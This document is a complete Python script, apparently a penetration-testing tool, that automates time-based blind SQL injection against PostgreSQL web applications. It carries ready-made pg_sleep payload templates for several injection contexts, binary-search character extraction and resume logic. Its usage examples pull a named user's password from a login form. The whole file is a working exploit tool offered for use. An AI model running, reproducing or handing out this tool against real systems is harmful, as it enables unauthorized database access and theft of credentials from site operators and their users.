#!/usr/bin/env python3
"""
pg_time_blind.py - Generic PostgreSQL time-based blind SQLi extractor.

Works against ANY PostgreSQL target with a time-based injection, regardless of:
  - HTTP method (GET / POST / anything)
  - where the injection lives (URL, body, or a header)
  - parameter name
  - injection context (stacked, AND, OR, numeric) via --preset / --template

It does NOT depend on sqlmap. Per character it does a binary search on the
ASCII value (~7 requests/char) instead of trying all 95 printable chars.

RESUME / MEMORY
  Progress is checkpointed to a small JSON state file in the current directory
  after every character. If the run is interrupted (Ctrl+C, dead box, network
  blip), just run the SAME command again and it auto-resumes from where it
  stopped. Use --fresh to ignore an existing checkpoint, or --state PATH to
  choose the file. The checkpoint is deleted automatically on success.

----------------------------------------------------------------------
HOW IT WORKS
  You mark the injection point with a placeholder (default: INJECT).
  The tool replaces that marker with a payload built from a template that
  contains {cond} (a true/false condition) and {sleep} (seconds to sleep).
  If the response is slow -> condition was TRUE.  Binary search does the rest.

----------------------------------------------------------------------
EXAMPLES

1) Login form (POST body, stacked query):
   python3 pg_time_blind.py \
     -u http://192.168.245.89:3000/login \
     -d "username=INJECT&password=test" \
     --query "SELECT password FROM users WHERE username='antwon'"

2) Re-use a saved raw HTTP request file (put INJECT where the payload goes):
   python3 pg_time_blind.py --request req.txt --query "SELECT current_user"

3) GET parameter, numeric AND context:
   python3 pg_time_blind.py -u "http://target/item?id=INJECT" \
     --preset and-num --query "SELECT version()"
----------------------------------------------------------------------
"""
import sys, os, time, json, hashlib, argparse, urllib.parse
import requests

requests.packages.urllib3.disable_warnings()

# Pre-built payload templates. {cond} = boolean condition, {sleep} = seconds.
PRESETS = {
    "stacked":  "';SELECT pg_sleep({sleep}) WHERE {cond}--",
    "and":      "' AND (CASE WHEN ({cond}) THEN (SELECT 1 FROM pg_sleep({sleep})) ELSE 1 END)=1--",
    "or":       "' OR (CASE WHEN ({cond}) THEN (SELECT 1 FROM pg_sleep({sleep})) ELSE 1 END)=1--",
    "and-num":  " AND (CASE WHEN ({cond}) THEN (SELECT 1 FROM pg_sleep({sleep})) ELSE 1 END)=1--",
    "or-num":   " OR (CASE WHEN ({cond}) THEN (SELECT 1 FROM pg_sleep({sleep})) ELSE 1 END)=1--",
}


def parse_request_file(path, proto):
    """Parse a raw HTTP request file into (method, url, headers, body)."""
    raw = open(path, "r", encoding="utf-8", errors="ignore").read().replace("\r\n", "\n")
    head, _, body = raw.partition("\n\n")
    lines = head.split("\n")
    method, target, _ = (lines[0].split() + ["", "", ""])[:3]
    headers = {}
    for ln in lines[1:]:
        if ":" in ln:
            k, v = ln.split(":", 1)
            headers[k.strip()] = v.strip()
    host = headers.get("Host", "")
    url = target if target.startswith("http") else f"{proto}://{host}{target}"
    return method, url, headers, body.rstrip("\n")


class Oracle:
    def __init__(self, a):
        self.a = a
        self.tpl = a.template or PRESETS[a.preset]
        self.count = 0
        if a.request:
            self.method, self.url, self.headers, self.data = parse_request_file(a.request, a.proto)
        else:
            self.url = a.url
            self.data = a.data
            self.headers = {}
            for h in (a.header or []):
                k, v = h.split(":", 1)
                self.headers[k.strip()] = v.strip()
            self.method = (a.method or ("POST" if a.data else "GET")).upper()
        self.proxies = {"http": a.proxy, "https": a.proxy} if a.proxy else None
        self.thresh = a.threshold if a.threshold else a.sleep * 0.6

    def _payload(self, cond):
        p = self.tpl.format(cond=cond, sleep=self.a.sleep)
        return urllib.parse.quote_plus(p) if self.a.encode else p

    def _put(self, s, payload):
        return s.replace(self.a.marker, payload) if s else s

    def fires(self, cond):
        """Send one request; return True if the sleep fired (response delayed)."""
        payload = self._payload(cond)
        url = self._put(self.url, payload)
        data = self._put(self.data, payload)
        headers = {k: self._put(v, payload) for k, v in self.headers.items()}
        # let requests set its own Content-Length / Host
        headers.pop("Content-Length", None)
        # requests does NOT set a form Content-Type for a raw string body,
        # so the server won't parse our params and the injection never lands.
        if data and not any(k.lower() == "content-type" for k in headers):
            headers["Content-Type"] = "application/x-www-form-urlencoded"
        for attempt in range(self.a.retries + 1):
            self.count += 1
            t = time.time()
            try:
                requests.request(self.method, url, data=data, headers=headers,
                                  proxies=self.proxies, verify=False,
                                  timeout=self.a.sleep + 15, allow_redirects=False)
            except requests.exceptions.RequestException as e:
                raise SystemExit(f"\n[!] request error: {e}\n"
                                 "    (progress is checkpointed — re-run the same command to resume)")
            dt = time.time() - t
            slow = dt >= self.thresh
            if slow and attempt < self.a.retries:
                continue  # confirm positives once to beat network jitter
            return slow
        return True

    def length(self, query):
        for n in range(1, self.a.maxlen + 1):
            if self.fires(f"length(({query}))={n}"):
                return n
        return None

    def char(self, query, pos):
        lo, hi = self.a.cmin, self.a.cmax
        while lo < hi:
            mid = (lo + hi) // 2
            if self.fires(f"ascii(substr(({query}),{pos},1))>{mid}"):
                lo = mid + 1
            else:
                hi = mid
        return chr(lo)


# ---------------------------- resume / checkpoint ----------------------------

def job_signature(a, o):
    """Stable id for this exact extraction, so we never resume the wrong job."""
    raw = "|".join([o.method, o.url or "", o.data or "", o.tpl, a.query,
                    str(a.sleep), str(a.cmin), str(a.cmax)])
    return hashlib.sha1(raw.encode()).hexdigest()[:10]

def load_state(path, sig):
    try:
        d = json.load(open(path))
        if d.get("sig") == sig:
            return d
    except Exception:
        pass
    return None

def save_state(path, sig, length, value, count):
    tmp = path + ".tmp"
    with open(tmp, "w") as f:
        json.dump({"sig": sig, "length": length, "value": value, "count": count}, f)
    os.replace(tmp, path)  # atomic: a crash mid-write can't corrupt the file


def main():
    ap = argparse.ArgumentParser(description="Generic PostgreSQL time-based blind extractor")
    src = ap.add_argument_group("target (use -u/-d/-H  OR  --request)")
    src.add_argument("-u", "--url", help="URL (may contain the marker for GET injection)")
    src.add_argument("-d", "--data", help="request body (may contain the marker)")
    src.add_argument("-H", "--header", action="append", help="extra header 'Name: value' (repeatable; may contain marker)")
    src.add_argument("-X", "--method", help="HTTP method (default: POST if -d given else GET)")
    src.add_argument("--request", help="raw HTTP request file with the marker inside")
    src.add_argument("--proto", default="http", help="proto for --request file (default http)")

    inj = ap.add_argument_group("injection")
    inj.add_argument("--query", required=True, help="SQL scalar to extract, e.g. \"SELECT password FROM users WHERE username='bob'\"")
    inj.add_argument("--preset", default="stacked", choices=list(PRESETS), help="payload shape (default: stacked)")
    inj.add_argument("--template", help="custom payload template using {cond} and {sleep} (overrides --preset)")
    inj.add_argument("--marker", default="INJECT", help="placeholder string for the injection point (default INJECT)")
    inj.add_argument("--no-encode", dest="encode", action="store_false", help="do NOT url-encode the payload")

    tun = ap.add_argument_group("tuning")
    tun.add_argument("--sleep", type=float, default=3.0, help="pg_sleep seconds (default 3)")
    tun.add_argument("--threshold", type=float, default=0.0, help="seconds to count as 'slept' (default sleep*0.6)")
    tun.add_argument("--retries", type=int, default=1, help="re-confirm a positive N times to beat jitter (default 1)")
    tun.add_argument("--maxlen", type=int, default=64, help="max length to probe (default 64)")
    tun.add_argument("--cmin", type=int, default=32, help="min ASCII for binary search (default 32)")
    tun.add_argument("--cmax", type=int, default=126, help="max ASCII for binary search (default 126)")
    tun.add_argument("--proxy", help="e.g. http://127.0.0.1:8080")

    res = ap.add_argument_group("resume / memory")
    res.add_argument("--state", help="checkpoint file path (default: auto-named .pgtb-<id>.json in cwd)")
    res.add_argument("--fresh", action="store_true", help="ignore any existing checkpoint and start over")

    ap.set_defaults(encode=True)
    a = ap.parse_args()

    if not a.request and not a.url:
        ap.error("provide -u/--url (with -d/-H) or --request")

    o = Oracle(a)
    sig = job_signature(a, o)
    state_path = a.state or f".pgtb-{sig}.json"

    print(f"[*] target  : {o.method} {o.url}")
    print(f"[*] preset  : {'custom template' if a.template else a.preset}")
    print(f"[*] query   : {a.query}")
    print(f"[*] state   : {state_path}")
    print(f"[*] sleep={a.sleep}s threshold={o.thresh:.2f}s\n")

    # baseline self-check: a condition that is always TRUE should fire
    if not o.fires("1=1"):
        print("[!] baseline TRUE condition did NOT delay the response.")
        print("    -> wrong preset/context, wrong marker placement, or not injectable here.")
        sys.exit(1)
    print("[+] injection confirmed (TRUE condition delayed the response)\n")

    # restore prior progress if a matching checkpoint exists
    value, length = "", None
    if not a.fresh:
        st = load_state(state_path, sig)
        if st:
            length = st.get("length")
            value = st.get("value", "")
            print(f"[*] resuming from checkpoint: {len(value)}/{length} chars  ->  '{value}'\n")

    # length (skip if restored)
    if length is None:
        length = o.length(a.query)
        if length is None:
            print("[!] length not found (empty result, bad query, or maxlen too low)")
            sys.exit(1)
        save_state(state_path, sig, length, value, o.count)
    print(f"[+] length = {length}\n[*] extracting: {value}", end="", flush=True)

    # extract char-by-char, checkpointing after each one
    try:
        for pos in range(len(value) + 1, length + 1):
            c = o.char(a.query, pos)
            value += c
            save_state(state_path, sig, length, value, o.count)
            sys.stdout.write(c); sys.stdout.flush()
    except KeyboardInterrupt:
        save_state(state_path, sig, length, value, o.count)
        print(f"\n\n[!] interrupted — progress saved to {state_path}")
        print("    re-run the SAME command to resume from here.")
        sys.exit(130)

    print(f"\n\n[+] RESULT: {value}")
    print(f"[*] total requests: {o.count}")
    try:
        os.remove(state_path)  # done — clean up the checkpoint
    except OSError:
        pass


if __name__ == "__main__":
    main()